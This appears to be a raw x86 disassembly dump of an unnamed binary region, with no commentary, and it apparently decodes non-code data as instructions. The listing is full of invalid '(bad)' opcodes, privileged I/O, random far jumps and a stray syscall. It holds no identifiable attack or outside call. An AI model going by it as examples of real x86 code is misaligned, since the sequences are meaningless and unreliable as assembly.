  4129c3:	stos   DWORD PTR es:[edi],eax
  4129c4:	jmp    0x0:0x84
  4129cb:	mov    ch,0x2d
  4129cd:	std    
  4129ce:	imul   esi,DWORD PTR [ebp-0x6d],0x83c2865c
  4129d5:	pop    ebx
  4129d6:	add    dh,cl
  4129d8:	outs   dx,DWORD PTR ds:[esi]
  4129d9:	ss std 
  4129db:	dec    edx
  4129dc:	or     DWORD PTR [eax-0x7a],0xffffffaa
  4129e0:	jnp    0x412a34
  4129e2:	call   0xfe2b8731
  4129e7:	data16 fwait
  4129e9:	inc    ecx
  4129ea:	jmp    0xf4b17e53
  4129ef:	popf   
  4129f0:	add    DWORD PTR [ecx-0x491b7f7f],esi
  4129f6:	(bad)  [ecx]
  4129f8:	jl     0x412a50
  4129fa:	jmp    0x47cb:0x4a4ebaf4
  412a01:	xor    ch,al
  412a03:	jns    0x412a07
  412a05:	xchg   esp,eax
  412a06:	jle    0x412a51
  412a08:	push   edx
  412a09:	cwde   
  412a0a:	push   esi
  412a0b:	test   al,0x75
  412a0d:	lods   eax,DWORD PTR ds:[esi]
  412a0e:	sti    
  412a0f:	mov    eax,ds:0x40eba479
  412a14:	push   cs
  412a15:	repz push ss
  412a17:	mov    ch,0x2
  412a19:	fcmove st,st(6)
  412a1b:	push   0x44
  412a1d:	mov    edi,0xad77a16f
  412a22:	pop    ss
  412a23:	pop    esp
  412a24:	mov    edi,0x45f25873
  412a29:	repz jo 0x412a77
  412a2c:	jecxz  0x4129d3
  412a2e:	das    
  412a2f:	add    BYTE PTR [eax],al
  412a31:	add    BYTE PTR [eax],al
  412a33:	add    ah,bh
  412a35:	cmp    al,0x1b
  412a37:	xor    eax,0x1855ec27
  412a3c:	repnz dec esp
  412a3e:	sbb    ebx,DWORD PTR [ebp-0x39]
  412a41:	imul   cl
  412a43:	push   ecx
  412a44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a45:	ja     0x412a08
  412a47:	sub    eax,DWORD PTR [eax-0x6]
  412a4a:	xor    bl,BYTE PTR [eax+ebx*8]
  412a4d:	or     eax,0x23514df
  412a52:	add    al,BYTE PTR [ecx+0x7d]
  412a55:	and    eax,0x2799587
  412a5a:	sbb    dl,BYTE PTR [eax+edi*4]
  412a5d:	cmp    eax,0xe6367d93
  412a62:	rol    BYTE PTR [ecx+0x59],cl
  412a65:	jo     0x412a18
  412a67:	jmp    0x1ad41492
  412a6c:	repnz add eax,DWORD PTR [eax]
  412a6f:	pusha  
  412a70:	cmp    al,0xfe
  412a72:	xchg   BYTE PTR [esi],cl
  412a74:	mov    DWORD PTR [edx+0x46],edi
  412a77:	sbb    eax,0xea15c220
  412a7c:	xor    al,0x1a
  412a7e:	push   0xfffffffe
  412a80:	(bad)  
  412a81:	in     eax,0x73
  412a83:	loope  0x412ae2
  412a85:	(bad)  
  412a87:	fbstp  TBYTE PTR [esi+0x5d258102]
  412a8d:	out    0x73,al
  412a8f:	xor    DWORD PTR [edi+ecx*1+0x18],ebx
  412a93:	fidiv  DWORD PTR [esi+0xe8b002]
  412a99:	add    BYTE PTR [eax],al
  412a9b:	add    BYTE PTR [eax],al
  412a9d:	and    ebx,edi
  412a9f:	push   esp
  412aa0:	push   ds
  412aa1:	push   0xa
  412aa3:	adc    DWORD PTR [ecx-0x513fcf8a],ebp
  412aa9:	mov    ecx,0x76edc2bb
  412aae:	dec    edi
  412aaf:	mov    DWORD PTR ds:0x9a10d5f0,ecx
  412ab5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ab6:	mov    esp,0xe576ee43
  412abb:	adc    esi,ecx
  412abd:	imul   eax,DWORD PTR [edx+0x0],0x46770e72
  412ac4:	loope  0x412b0c
  412ac6:	jnp    0x412b0b
  412ac8:	(bad)  
  412aca:	push   cs
  412acb:	adc    al,0xda
  412acd:	add    dh,BYTE PTR ss:[ecx]
  412ad0:	mov    ds:0xf0f8475f,al
  412ad5:	cmp    al,0x16
  412ad7:	jbe    0x412b07
  412ad9:	dec    eax
  412ada:	aas    
  412adb:	or     BYTE PTR [edx-0x4a],ch
  412ade:	std    
  412adf:	xchg   BYTE PTR [eax*8+0x31e15b7a],ah
  412ae6:	cmp    al,0x28
  412ae8:	add    eax,DWORD PTR [eax-0x6bffbb89]
  412aee:	loop   0x412b3d
  412af0:	jmp    DWORD PTR [ecx+0x6015fbd2]
  412af6:	adc    BYTE PTR [eax+0x0],al
  412af9:	pop    ds
  412afa:	mov    ds:0x544c850c,eax
  412aff:	inc    ebx
  412b00:	mov    eax,DWORD PTR [eax]
  412b02:	add    BYTE PTR [eax],al
  412b04:	add    BYTE PTR [eax],al
  412b06:	shr    BYTE PTR [esi],cl
  412b08:	inc    DWORD PTR [esp+edx*2-0x7a]
  412b0c:	jns    0x412b1a
  412b0e:	pop    esp
  412b0f:	jno    0x412b1d
  412b11:	xor    esp,DWORD PTR [ebp+0x2489085c]
  412b17:	loop   0x412a9f
  412b19:	dec    eax
  412b1a:	push   esp
  412b1b:	mov    edi,0x61548b27
  412b20:	lds    esi,FWORD PTR [eax+ecx*2+0x5f]
  412b24:	shr    DWORD PTR [ebx],cl
  412b26:	jge    0x412aac
  412b28:	cli    
  412b29:	mov    BYTE PTR [edi],ch
  412b2b:	push   es
  412b2c:	add    BYTE PTR [edx+0x19],dh
  412b2f:	jmp    0x412b71
  412b31:	add    al,0x6
  412b33:	loope  0x412b8b
  412b35:	mov    DWORD PTR [ebp*1-0x2271fbb8],esi
  412b3c:	xchg   BYTE PTR [eax+0x14],bh
  412b3f:	pop    ebp
  412b40:	dec    eax
  412b41:	add    al,0x27
  412b43:	add    edi,DWORD PTR [edi+0x60]
  412b46:	add    al,0x6
  412b48:	mov    BYTE PTR [ebp-0x35],0x7
  412b4c:	sti    
  412b4d:	inc    ebp
  412b4e:	les    ebx,FWORD PTR [ebp+0x41]
  412b51:	clc    
  412b52:	dec    edi
  412b53:	inc    ebx
  412b54:	or     BYTE PTR [edi+ecx*2],cl
  412b57:	lds    edx,FWORD PTR [ebx]
  412b59:	cmp    esp,DWORD PTR [edx+0x1b8d71fa]
  412b5f:	push   esp
  412b60:	lock inc ecx
  412b63:	or     eax,0x5bcc400f
  412b68:	inc    ecx
  412b69:	inc    DWORD PTR [eax]
  412b6b:	add    BYTE PTR [eax],al
  412b6d:	add    BYTE PTR [eax],al
  412b6f:	jne    0x412b89
  412b71:	dec    ecx
  412b72:	(bad)  
  412b73:	mov    bh,0xe3
  412b75:	add    DWORD PTR [ebx-0x12],edx
  412b78:	ja     0x412afb
  412b7a:	in     al,0x9d
  412b7c:	ins    BYTE PTR es:[edi],dx
  412b7d:	fcom   DWORD PTR [eax]
  412b7f:	(bad)  
  412b80:	in     al,dx
  412b81:	jp     0x412b03
  412b83:	stc    
  412b84:	jmp    0x2440:0x522b0001
  412b8b:	imul   edx,DWORD PTR [ecx+eax*2+0x3c],0x244062ca
  412b93:	sub    DWORD PTR [esi+esi*4-0x3],0x8b01b5cb
  412b9b:	mov    cl,0x7
  412b9d:	or     al,0x50
  412b9f:	fucomip st,st(5)
  412ba1:	out    0x13,al
  412ba3:	dec    ecx
  412ba4:	mov    ebp,0xed800041
  412ba9:	add    al,0x0
  412bab:	jne    0x412c24
  412bad:	cld    
  412bae:	sub    BYTE PTR ds:0x82f6ea,0xeb
  412bb5:	add    DWORD PTR [eax],eax
  412bb7:	test   BYTE PTR [esi-0x638af7e3],0xc1
  412bbe:	mov    edx,DWORD PTR [ecx-0x7570a31]
  412bc4:	stos   DWORD PTR es:[edi],eax
  412bc5:	stc    
  412bc6:	dec    edi
  412bc7:	add    bl,dh
  412bc9:	or     eax,0x7aebb511
  412bce:	inc    ecx
  412bcf:	xchg   ebp,eax
  412bd0:	outs   dx,BYTE PTR ds:[esi]
  412bd1:	shl    DWORD PTR [eax+eax*1+0x0],0x0
  412bd6:	add    BYTE PTR [eax],al
  412bd8:	xchg   edi,eax
  412bd9:	cmp    ah,BYTE PTR fs:[eax+edi*8]
  412bdd:	xchg   ecx,eax
  412bde:	ins    DWORD PTR es:[edi],dx
  412bdf:	sbb    DWORD PTR [ebx+edi*8-0x25],eax
  412be3:	loop   0x412bde
  412be5:	xchg   edi,eax
  412be6:	out    0x89,al
  412be8:	int    0x63
  412bea:	inc    edx
  412beb:	and    al,0xec
  412bed:	add    DWORD PTR [ebx],ebp
  412bef:	and    BYTE PTR [ecx-0x79],ch
  412bf2:	sahf   
  412bf3:	jo     0x412b78
  412bf5:	mov    al,ds:0x2873667
  412bfa:	cmp    dh,0xed
  412bfd:	pop    ebp
  412bfe:	retf   
  412bff:	sti    
  412c00:	cmc    
  412c01:	iret   
  412c02:	jle    0x412c7c
  412c04:	xor    al,0xa
  412c06:	pop    ss
  412c07:	out    0x66,eax
  412c09:	cli    
  412c0a:	fld    DWORD PTR [ebx+0x75]
  412c0d:	xchg   DWORD PTR [esi+0x6f],esp
  412c10:	jmp    0x74da7b49
  412c15:	add    ah,bh
  412c17:	jg     0x412c4e
  412c19:	push   esi
  412c1a:	out    0xa5,al
  412c1c:	cmc    
  412c1d:	dec    edi
  412c1e:	fld    DWORD PTR [ebx]
  412c20:	dec    esp
  412c21:	es outs dx,DWORD PTR ds:[esi]
  412c24:	cdq    
  412c25:	push   cs
  412c26:	sahf   
  412c27:	pop    ecx
  412c28:	jno    0x412c96
  412c2a:	out    0x59,eax
  412c2c:	xchg   edi,ebx
  412c2e:	fcmovu st,st(3)
  412c30:	lds    esp,FWORD PTR [esi-0x677ffc18]
  412c36:	pop    ss
  412c37:	out    dx,al
  412c38:	dec    ebx
  412c39:	cld    
  412c3a:	adc    al,0x84
  412c3c:	add    BYTE PTR [eax],al
  412c3e:	add    BYTE PTR [eax],al
  412c40:	add    BYTE PTR [ebx],bl
  412c42:	add    esp,DWORD PTR [esi+0x1f]
  412c45:	jne    0x412bc8
  412c47:	and    eax,0xe6f4c083
  412c4c:	dec    esi
  412c4d:	sbb    eax,0xe66310
  412c52:	jmp    0x463e:0xdff8e532
  412c59:	cld    
  412c5a:	in     eax,0x34
  412c5c:	rol    DWORD PTR [ebx+ecx*4+0x2b],0x20
  412c61:	ins    DWORD PTR es:[edi],dx
  412c62:	jmp    0xc3fa:0xdfd8e4e1
  412c69:	sub    al,0xc4
  412c6b:	add    ch,ch
  412c6d:	jbe    0x412ca0
  412c6f:	push   esi
  412c70:	(bad)  
  412c71:	leave  
  412c72:	xor    eax,0x32b9478b
  412c77:	std    
  412c78:	hlt    
  412c79:	xor    cl,0x3f
  412c7c:	jmp    0x8e698ca4
  412c81:	push   eax
  412c82:	jmp    0xf7fd:0xdd906ad9
  412c89:	inc    esi
  412c8a:	jmp    0xd96a:0xdd906ad1
  412c91:	cs enter 0xe905,0x39
  412c96:	dec    edx
  412c97:	jae    0x412cf9
  412c99:	hlt    
  412c9a:	(bad)  
  412c9b:	and    BYTE PTR [esi-0x65],dl
  412c9e:	jmp    0xf16a:0xdd586abd
  412ca5:	add    BYTE PTR [eax],al
  412ca7:	add    BYTE PTR [eax],al
  412ca9:	add    BYTE PTR [esi-0x6f16f938],ch
  412caf:	dec    edx
  412cb0:	jae    0x412ce2
  412cb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cb3:	fst    QWORD PTR [ebx]
  412cb5:	shl    DWORD PTR [ebp+0x42],1
  412cb8:	add    dh,al
  412cba:	mov    al,0x39
  412cbc:	shl    DWORD PTR [ebp+ebp*4+0x59057fee],0xdf
  412cc4:	std    
  412cc5:	jmp    0x7296658f
  412cca:	xchg   edx,eax
  412ccb:	or     cl,BYTE PTR [ecx-0x737d721a]
  412cd1:	call   0xa4c82f4c
  412cd6:	adc    cl,al
  412cd8:	inc    ebx
  412cd9:	loop   0x412d51
  412cdb:	cdq    
  412cdc:	xor    BYTE PTR [ecx+edi*2+0x2],dl
  412ce0:	mov    ebp,DWORD PTR [edi*4-0x412976cf]
  412ce7:	inc    ebx
  412ce8:	sti    
  412ce9:	add    BYTE PTR [ebx-0x1c3f7b1b],dh
  412cef:	pop    esi
  412cf0:	into   
  412cf1:	add    ah,bl
  412cf3:	add    cl,BYTE PTR [edx+0x41baac45]
  412cf9:	sahf   
  412cfa:	adc    esp,esi
  412cfc:	xchg   eax,esi
  412cfe:	pop    ds
  412cff:	in     eax,0x2
  412d01:	jne    0x412c9b
  412d03:	cmp    BYTE PTR [eax],dl
  412d05:	jmp    0x412ca2
  412d07:	cmp    esi,0x67df9917
  412d0d:	sbb    al,0x0
  412d0f:	add    BYTE PTR [eax],al
  412d11:	add    BYTE PTR [eax],al
  412d13:	push   esp
  412d14:	mov    ecx,0x32dc3302
  412d19:	mov    DWORD PTR [ebp+0x2c],eax
  412d1c:	cmp    DWORD PTR [eax],eax
  412d1e:	push   eax
  412d1f:	adc    edx,DWORD PTR [eax]
  412d21:	inc    eax
  412d22:	push   ss
  412d23:	sbb    al,0x2
  412d25:	jg     0x412ceb
  412d27:	push   eax
  412d28:	inc    eax
  412d29:	test   DWORD PTR [ebp-0x14],esi
  412d2c:	pop    ss
  412d2d:	dec    esi
  412d2e:	je     0x412d82
  412d30:	sub    esi,0x15
  412d33:	arpl   WORD PTR [ebp-0x6d],bx
  412d36:	add    BYTE PTR [edx+eax*1+0x6a],bl
  412d3a:	adc    BYTE PTR [ecx-0x3eaf22e4],ah
  412d40:	sbb    al,0xa8
  412d42:	push   eax
  412d43:	xchg   ebx,eax
  412d44:	or     al,0x3c
  412d46:	push   ss
  412d47:	fadd   QWORD PTR [ecx]
  412d49:	jg     0x412d0f
  412d4b:	inc    eax
  412d4c:	mov    ebx,0xe0c98b06
  412d51:	test   DWORD PTR [ebp-0x48],eax
  412d54:	aas    
  412d55:	xchg   DWORD PTR [ebp+0xd],eax
  412d58:	cmp    edi,ebp
  412d5a:	dec    BYTE PTR [ecx-0x333e991f]
  412d60:	push   cs
  412d61:	mov    DWORD PTR [ebp+0x24],esi
  412d64:	imul   eax,DWORD PTR [ebp-0x13768abb],0xe1ccfe8c
  412d6e:	std    
  412d6f:	pusha  
  412d70:	lahf   
  412d71:	pop    DWORD PTR [ebx+0x15]
  412d74:	xor    al,0xf4
  412d76:	and    al,0x0
  412d78:	add    BYTE PTR [eax],al
  412d7a:	add    BYTE PTR [eax],al
  412d7c:	jne    0x412d69
  412d7e:	mov    cs,esi
  412d80:	int    0x4e
  412d82:	cmp    ch,0xba
  412d85:	outs   dx,DWORD PTR ds:[esi]
  412d86:	les    esi,FWORD PTR [esi+ecx*4+0x68]
  412d8a:	pop    edi
  412d8b:	or     al,0x75
  412d8d:	(bad)  
  412d8e:	cmp    ebp,edi
  412d90:	sub    BYTE PTR [edi-0x73],dh
  412d93:	push   ebx
  412d94:	imul   edi,eax,0x502d036d
  412d9a:	shr    al,cl
  412d9c:	mov    edi,0xf9fde14a
  412da1:	stos   DWORD PTR es:[edi],eax
  412da2:	push   edi
  412da3:	aas    
  412da4:	pminsw mm2,QWORD PTR [eax-0x7164aebd]
  412dab:	cmc    
  412dac:	pop    ebp
  412dad:	or     eax,0x3e62fddf
  412db2:	push   edi
  412db3:	enter  0xae32,0xc9
  412db7:	mov    esp,0xe801abc6
  412dbc:	arpl   WORD PTR [esi],si
  412dbe:	loope  0x412dbd
  412dc0:	inc    ebx
  412dc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dc2:	fiadd  WORD PTR [eax+0xd0720b8]
  412dc8:	neg    ebx
  412dca:	loop   0x412dc9
  412dcc:	sub    bh,BYTE PTR [ecx-0x6f3ca23f]
  412dd2:	int3   
  412dd3:	ret    0xeb69
  412dd6:	imul   edi,edi,0x1
  412dd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dda:	mov    ebp,0xe9dbfe50
  412ddf:	hlt    
  412de0:	add    BYTE PTR [eax],al
  412de2:	add    BYTE PTR [eax],al
  412de4:	add    BYTE PTR [ecx],al
  412de6:	in     al,dx
  412de7:	loop   0x412dd2
  412de9:	push   ds
  412dea:	add    dl,BYTE PTR [ecx+0x13]
  412ded:	(bad)  
  412dee:	pop    esi
  412def:	fwait
  412df0:	cmp    ebx,ebp
  412df2:	cmp    ecx,DWORD PTR [ecx+0x5]
  412df5:	jne    0x412dd4
  412df7:	push   esp
  412df8:	hlt    
  412df9:	out    dx,eax
  412dfa:	xchg   esi,eax
  412dfb:	mov    bl,0xe1
  412dfd:	rcr    ah,1
  412dff:	mov    esi,0x1aea7958
  412e04:	adc    dl,al
  412e06:	fsub   QWORD PTR [edx+0x58]
  412e09:	mov    DWORD PTR gs:[esi-0x61b60974],ebp
  412e10:	loop   0x412dba
  412e12:	mov    gs,WORD PTR [eax+ecx*4]
  412e15:	inc    ebp
  412e16:	jmp    0xc36b:0xdc98804e
  412e1d:	or     DWORD PTR [esi+ebp*8],ebx
  412e20:	call   0x709:0x4c1f8636
  412e27:	push   0xffffffeb
  412e29:	push   di
  412e2b:	in     eax,dx
  412e2c:	push   ss
  412e2d:	xor    eax,0xf3487065
  412e32:	lea    ebp,[edi+esi*1+0x60]
  412e36:	fmul   QWORD PTR [esi+0x33]
  412e39:	out    dx,al
  412e3a:	inc    ebp
  412e3b:	imul   esi,DWORD PTR [ebx],0x5d
  412e3e:	mov    dl,0x83
  412e40:	loop   0x412e8a
  412e42:	xchg   DWORD PTR [edi],esp
  412e44:	push   edi
  412e45:	push   0x37648d
  412e4a:	add    BYTE PTR [eax],al
  412e4c:	add    BYTE PTR [eax],al
  412e4e:	cmp    ah,bl
  412e50:	es xor edi,esi
  412e53:	inc    ebp
  412e54:	pop    ebx
  412e55:	xor    edi,esi
  412e57:	test   DWORD PTR [ebx],esp
  412e59:	loope  0x412e7b
  412e5b:	fdiv   QWORD PTR [edi-0x17f12015]
  412e61:	add    edi,esi
  412e63:	test   DWORD PTR [ebx],ebp
  412e65:	loope  0x412e6f
  412e67:	fadd   QWORD PTR [eax]
  412e69:	cdq    
  412e6a:	pop    ss
  412e6b:	push   eax
  412e6c:	hlt    
  412e6d:	pop    esp
  412e6e:	lods   eax,DWORD PTR ds:[esi]
  412e6f:	retf   0x3f51
  412e72:	test   eax,0xd48424ea
  412e77:	fisttp QWORD PTR [ebx-0x2233a64]
  412e7d:	into   
  412e7e:	jmp    0x412e3a
  412e80:	call   0xfe1c93d8
  412e85:	jb     0x412ea9
  412e87:	or     ch,BYTE PTR [edx-0x17]
  412e8a:	repz aas 
  412e8c:	fcomp  QWORD PTR [ecx]
  412e8e:	leave  
  412e8f:	xor    bh,ah
  412e91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e92:	xchg   esp,eax
  412e93:	xchg   DWORD PTR [ebx-0x4f],esi
  412e96:	mov    esp,0x4855c83f
  412e9b:	inc    edx
  412e9c:	add    BYTE PTR [ecx-0x790281cf],al
  412ea2:	add    eax,edx
  412ea4:	out    0xbb,eax
  412ea6:	xchg   ebp,eax
  412ea7:	(bad)  
  412ea9:	sbb    al,0xf0
  412eab:	out    dx,al
  412eac:	jg     0x412f2b
  412eae:	adc    eax,0xe8ffff
  412eb3:	add    BYTE PTR [eax],al
  412eb5:	add    BYTE PTR [eax],al
  412eb7:	test   eax,0x7ef4fd35
  412ebc:	icebp  
  412ebd:	aas    
  412ebe:	jmp    0x604975b4
  412ec3:	mov    dl,0xee
  412ec5:	mov    edi,ebp
  412ec7:	push   ebp
  412ec8:	xchg   edx,eax
  412ec9:	mov    eax,gs
  412ecb:	jbe    0x412ecf
  412ecd:	mov    ebx,DWORD PTR [edx+edx*2+0x76b4306a]
  412ed4:	add    ch,BYTE PTR [edx-0x13]
  412ed7:	outs   dx,BYTE PTR ds:[esi]
  412ed8:	jmp    0x2984:0xdd14499e
  412edf:	retf   0x3205
  412ee2:	sub    DWORD PTR [esi],ecx
  412ee4:	fld    DWORD PTR [eax]
  412ee6:	add    BYTE PTR [edi+edi*8],bl
  412ee9:	xchg   BYTE PTR [esi],al
  412eeb:	or     esi,DWORD PTR [eax+ecx*1]
  412eee:	mov    ecx,DWORD PTR [esi+eax*4-0x79f30003]
  412ef5:	dec    ecx
  412ef6:	clc    
  412ef7:	fisttp DWORD PTR [ebx+0x22c4f059]
  412efd:	icebp  
  412efe:	dec    ebx
  412f00:	add    al,0x74
  412f03:	or     ah,dl
  412f05:	jno    0x412ef7
  412f07:	inc    edi
  412f08:	inc    esp
  412f09:	hlt    
  412f0a:	call   0x417147
  412f0f:	mov    edi,0xb445859d
  412f14:	std    
  412f15:	mov    esi,0xa32a0f
  412f1a:	add    BYTE PTR [eax],al
  412f1c:	add    BYTE PTR [eax],al
  412f1e:	add    BYTE PTR [eax],al
  412f20:	pushf  
  412f21:	mov    edi,DWORD PTR [ecx-0x41df97c]
  412f27:	call   0x414cfc
  412f2c:	pop    es
  412f2d:	dec    esp
  412f2e:	lock push 0xffffff9d
  412f31:	mov    eax,DWORD PTR [ecx-0x41df597]
  412f37:	push   eax
  412f38:	pop    ss
  412f39:	inc    esp
  412f3a:	hlt    
  412f3b:	sub    esp,DWORD PTR [ecx]
  412f3d:	out    dx,al
  412f3e:	call   0x45db01
  412f43:	mov    eax,esp
  412f45:	div    dh
  412f47:	je     0x412f71
  412f49:	xchg   DWORD PTR [ebx],eax
  412f4b:	mov    ebx,DWORD PTR [edx+ebx*8]
  412f4e:	xchg   BYTE PTR [ebp-0x74],bl
  412f51:	test   BYTE PTR [eax-0x14],0x0
  412f55:	or     al,0x7f
  412f57:	dec    ebp
  412f58:	test   dl,ah
  412f5a:	out    0x5c,eax
  412f5c:	out    dx,eax
  412f5d:	ins    DWORD PTR es:[edi],dx
  412f5e:	enter  0x1c00,0x6
  412f62:	push   ebx
  412f63:	call   0xfffebadd
  412f68:	sbb    dh,BYTE PTR [ebp-0x3d878b3c]
  412f6e:	cmp    DWORD PTR [eax+eax*4],ecx
  412f71:	mov    ebp,0x78996a34
  412f76:	jmp    0x22c48c9
  412f7b:	cmp    DWORD PTR [esi+0x4d36f237],esi
  412f81:	out    0x55,eax
  412f83:	or     eax,DWORD PTR [eax]
  412f85:	add    BYTE PTR [eax],al
  412f87:	add    BYTE PTR [eax],al
  412f89:	dec    edx
  412f8a:	fs (bad) 
  412f8c:	call   0xfe1ee349
  412f91:	cld    
  412f92:	es fsub st(1),st
  412f95:	popf   
  412f96:	push   esp
  412f97:	(bad)  
  412f98:	call   0xfe1ebf5f
  412f9d:	es inc ebx
  412f9f:	jnp    0x412fa1
  412fa1:	jne    0x412f8e
  412fa3:	adc    al,al
  412fa5:	popf   
  412fa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fa7:	push   ebx
  412fa8:	jmp    DWORD PTR [edx+0x75986c1c]
  412fae:	jmp    0x412fb1
  412fb0:	xor    DWORD PTR [ebp+0x746fee73],esi
  412fb6:	jmp    0x412f7e
  412fb8:	inc    ebx
  412fb9:	jge    0x412fa5
  412fbb:	add    DWORD PTR [eax],eax
  412fbd:	jne    0x413027
  412fbf:	adc    eax,0xdd6b3ee8
  412fc4:	std    
  412fc5:	ret    0xc733
  412fc8:	and    BYTE PTR [edx+0x30],0xdd
  412fcc:	jae    0x413033
  412fce:	inc    ebx
  412fcf:	lahf   
  412fd0:	adc    BYTE PTR [edx+0x40],0x89
  412fd4:	push   es
  412fd5:	dec    edx
  412fd6:	mov    ds,ecx
  412fd8:	mov    DWORD PTR [eax-0xa7f751d],esi
  412fde:	jmp    0x25e2fe4
  412fe3:	pop    edx
  412fe4:	fsubr  DWORD PTR [eax]
  412fe6:	(bad)  
  412fe8:	ret    
  412fe9:	hlt    
  412fea:	push   esi
  412feb:	syscall 
  412fed:	add    BYTE PTR [eax],al
  412fef:	add    BYTE PTR [eax],al
  412ff1:	add    BYTE PTR [eax+0x6e],ch
  412ff4:	daa    
  412ff5:	aas    
  412ff6:	lods   al,BYTE PTR ds:[esi]
  412ff7:	retf   
  412ff8:	sub    DWORD PTR [eax],ecx
  412ffa:	jne    0x413068
  412ffc:	shr    ebx,cl
  412ffe:	or     eax,0xa503e71e
  413003:	xchg   DWORD PTR [esi-0x326baf9],esp
  413009:	inc    edi
  41300a:	add    DWORD PTR [edx-0x19],0xffffff82
  41300e:	mov    ecx,0x61c36c05
  413013:	add    DWORD PTR [ecx],ebx
  413015:	(bad)  
  413016:	fidivr DWORD PTR [edi+0x97503e7]
  41301c:	jbe    0x413064
  41301e:	popa   
  41301f:	xor    eax,0x2fce131c
  413024:	inc    ebp
  413025:	sbb    esi,DWORD PTR [esi+0x398b3b4d]
  41302b:	push   ds
  41302c:	test   DWORD PTR [edx-0x7b2f9f86],0x3e70379
  413036:	push   es
  413037:	aas    
  413038:	adc    DWORD PTR ds:0xde48759d,eax
  41303e:	or     BYTE PTR [edi+esi*2-0x50b279e6],0x1c
  413046:	mov    ds:0xcb911558,eax
  41304b:	(bad)  
  41304c:	imul   ebx,DWORD PTR [edx+0x79],0xec00dbf2
  413053:	add    esp,DWORD PTR [ebx+eax*8+0x0]
  413057:	add    BYTE PTR [eax],al
  413059:	add    BYTE PTR [eax],al
  41305b:	leave  
  41305c:	out    dx,eax
  41305d:	imul   eax,ebx,0x33e36c71
  413063:	out    dx,al
  413064:	aas    
  413065:	add    cl,dl
  413067:	xchg   ch,dl
  413069:	adc    esp,DWORD PTR [ebp+0x6a001828]
  41306f:	xor    al,BYTE PTR [edi]
  413071:	sub    DWORD PTR [ecx],0xffffffca
  413074:	push   ebx
  413075:	inc    ebx
  413076:	push   0x37
  413078:	or     edi,DWORD PTR [ecx]
  41307a:	mov    edi,0x1156b3b2
  41307f:	or     DWORD PTR [eax-0x3],ebx
  413082:	(bad)  
  413083:	jo     0x413012
  413085:	inc    ebp
  413086:	(bad)  
  413087:	addr16 jmp 0x4130f0
  41308a:	mov    dl,0xbd
  41308c:	dec    esi
  41308d:	push   esp
  41308e:	jb     0x4130d5
  413090:	push   ds
  413091:	adc    BYTE PTR [edx+0x6e],dh
  413094:	pusha  
  413095:	aaa    
  413096:	push   0xe9fdd8db
  41309b:	sub    eax,DWORD PTR [ebx+0x6a]
  41309e:	jmp    0x41307e
  4130a0:	sbb    ebx,DWORD PTR [edi-0xf765f42]
  4130a6:	repnz mov ds:0x60f0384e,eax
  4130ac:	pop    eax
  4130ad:	cs je  0x41311b
  4130b0:	inc    BYTE PTR [eax+0x72f66d22]
  4130b6:	hlt    
  4130b7:	in     eax,dx
  4130b8:	add    DWORD PTR [ebx-0x7f12d257],eax
  4130be:	test   eax,0x0
  4130c3:	add    BYTE PTR [ecx+0x6c],bh
  4130c6:	adc    BYTE PTR [ecx],bl
  4130c8:	repnz cmp eax,0xf398191e
  4130ce:	inc    ebx
  4130cf:	xlat   BYTE PTR ds:[ebx]
  4130d0:	mov    dh,0x2
  4130d2:	sub    DWORD PTR ds:0xd5c08385,0x2a814468
  4130dc:	imul   ebx,DWORD PTR [ecx],0x300bcd2e
  4130e2:	call   0xfb7626e7
  4130e7:	(bad)  
  4130e8:	ds ret 
  4130ea:	pop    esi
  4130eb:	pop    ebp
  4130ec:	out    0xc0,eax
  4130ee:	add    al,0x0
  4130f0:	or     ch,bl
  4130f2:	lods   al,BYTE PTR ds:[esi]
  4130f3:	jg     0x413148
  4130f5:	mov    ch,0xb0
  4130f7:	add    DWORD PTR [edi+0x7d8b56ae],eax
  4130fd:	out    0xf,al
  4130ff:	add    BYTE PTR [ebx+eax*1],bl
  413102:	test   BYTE PTR [eax+edi*1+0xb],0xfd
  413107:	jae    0x413123
  413109:	or     eax,0xb68393e8
  41310e:	sti    
  41310f:	mov    ebx,DWORD PTR [edx-0x23fb3de8]
  413115:	mov    DWORD PTR [esi+0x8],eax
  413118:	sbb    edi,ebp
  41311a:	sub    esi,DWORD PTR [ebp-0x74]
  41311d:	inc    BYTE PTR [eax-0x78f3d740]
  413123:	or     BYTE PTR [ebp+esi*4+0x4d],ch
  413127:	or     BYTE PTR [eax],al
  413129:	add    BYTE PTR [eax],al
  41312b:	add    BYTE PTR [eax],al
  41312d:	dec    edi
  41312e:	pop    ebp
  41312f:	or     BYTE PTR [eax],al
  413131:	add    ebp,DWORD PTR ds:0x42c9ff0c
  413137:	cmovo  ebx,DWORD PTR [ecx+ecx*4+0x7504e9ce]
  41313f:	add    BYTE PTR [eax],al
  413141:	pop    ecx
  413142:	mov    esp,ebp
  413144:	push   ecx
  413145:	dec    edx
  413146:	icebp  
  413147:	cmc    
  413148:	push   esi
  413149:	push   0x10
  41314b:	push   0x3
  41314d:	push   0x10
  41314f:	push   esi
  413150:	push   0x3
  413152:	or     eax,0xcfd415fb
  413157:	cmp    eax,0x74bc9700
  41315c:	or     eax,DWORD PTR [ecx+0x7500fed9]
  413162:	imul   edx,DWORD PTR [ebp+0x4],0xffffff87
  413166:	sub    ebp,eax
  413168:	xor    al,0xa2
  41316a:	mov    bl,0xe1
  41316c:	adc    eax,0xb069ebb5
  413171:	pop    ebp
  413172:	stos   DWORD PTR es:[edi],eax
  413173:	add    eax,ebp
  413175:	and    DWORD PTR [esi+0x1],esp
  413178:	add    dh,bh
  41317a:	and    ebx,DWORD PTR [eax]
  41317c:	(bad)  
  41317d:	test   al,0xdf
  41317f:	xadd   BYTE PTR [esi],cl
  413182:	shl    DWORD PTR [eax],cl
  413184:	std    
  413185:	mov    BYTE PTR [edi-0x474eec24],dh
  41318b:	inc    ecx
  41318c:	add    dh,ch
  41318e:	and    ecx,DWORD PTR [eax+0x5]
  413194:	add    BYTE PTR [eax],al
  413196:	ds in  eax,dx
  413198:	push   ebp
  413199:	or     ecx,DWORD PTR [edx-0x1c]
  41319c:	xor    cl,BYTE PTR [eax]
  41319e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
